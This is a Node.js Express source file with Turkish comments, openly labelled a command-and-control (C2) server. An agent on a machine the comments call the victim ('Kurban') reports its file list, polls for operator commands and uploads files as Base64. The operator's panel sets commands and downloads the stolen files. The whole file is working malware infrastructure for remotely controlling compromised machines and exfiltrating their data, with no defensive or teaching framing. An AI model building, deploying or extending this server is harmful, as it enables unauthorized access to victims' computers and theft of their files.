const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

// JSON verilerini ve büyük Base64 dosyalarını alabilmek için limitleri artırdık
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ limit: '50mb', extended: true }));

// Bellekteki sanal veritabanımız
let database = {
    fileList: [],
    lastUpdate: "Henüz veri gelmedi",
    pendingCommand: "IDLE" // Varsayılan durum: Beklemede
};

// Dosya transferi için geçici depo
let tempFileStorage = {
    fileName: "",
    data: null
};

// 1. ANA SAYFA: Sistemin ayakta olduğunu kontrol etmek için
app.get('/', (req, res) => {
    res.send("<h1>C2 Server Aktif</h1><p>Sistem çalışıyor dostum. Panel ve Client bağlantı kurabilir.</p>");
});

// 2. AGENT KAPISI: Client (Kurban) buraya bağlanır
app.all('/agent', (req, res) => {
    if (req.method === 'POST') {
        console.log("Client'tan dosya listesi geldi.");
        if (req.body && req.body.files) {
            database.fileList = req.body.files;
            database.lastUpdate = new Date().toLocaleString('tr-TR');
        }
    }
    
    // Client her bağlandığında bekleyen komutu ona bildiriyoruz
    res.json({
        status: "Bağlantı Başarılı",
        command: database.pendingCommand
    });
});

// 3. PANEL VERİ KAPISI: Senin GUI programın verileri buradan çeker
app.get('/panel', (req, res) => {
    res.json(database);
});

// 4. PANEL KOMUT KAPISI: Sen butona bastığında komut buraya gelir
app.all('/panel/command', (req, res) => {
    if (req.method === 'POST') {
        if (req.body && req.body.command) {
            database.pendingCommand = req.body.command;
            console.log("Yeni Komut Set Edildi:", database.pendingCommand);
            return res.json({ status: "Success", newCommand: database.pendingCommand });
        }
    }
    // Tarayıcıdan girilirse mevcut durumu gösterir
    res.json({ status: "Command Endpoint Aktif", currentCommand: database.pendingCommand });
});

// 5. UPLOAD KAPISI: Client dosyayı okuyup buraya POST eder
app.post('/upload', (req, res) => {
    if (req.body && req.body.data) {
        tempFileStorage.fileName = req.body.fileName;
        tempFileStorage.data = req.body.data;
        console.log(`Dosya Alındı: ${tempFileStorage.fileName}`);
        
        // Dosya alındığı için komutu tekrar IDLE'a çekelim ki sürekli indirmesin
        database.pendingCommand = "IDLE";
        
        res.json({ status: "File Uploaded Successfully" });
    } else {
        res.status(400).json({ status: "No data received" });
    }
});

// 6. DOWNLOAD KAPISI: Panel (GUI) dosyayı buradan bilgisayarına çeker
app.get('/download-file', (req, res) => {
    if (tempFileStorage.data) {
        res.json(tempFileStorage);
    } else {
        res.json({ status: "No file available" });
    }
});

app.listen(PORT, () => {
    console.log(`Server ${PORT} portu üzerinde hazır.`);
});
